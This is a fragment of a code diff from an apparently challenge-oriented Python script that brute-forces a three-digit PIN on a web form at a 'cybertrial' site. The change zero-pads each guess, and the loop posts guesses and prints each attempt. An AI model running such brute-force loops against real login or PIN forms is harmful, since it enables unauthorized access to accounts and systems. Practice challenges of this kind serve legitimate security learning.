@@ -18,7 +18,7 @@ response = r.get("http://104.cybertrial.co.uk/?mykey=" + key)
 #for curPin in range(0, 1000):
 for i in range(max):
 	if(i>min):
-		payload = {"formgo": "1", "pin": str(i)}
+		payload = {"formgo": "1", "pin": str("{0:0=3d}".format(i))}
 		print("Trying pin: " + payload["pin"])
 
 		response = r.post(url, data=payload)
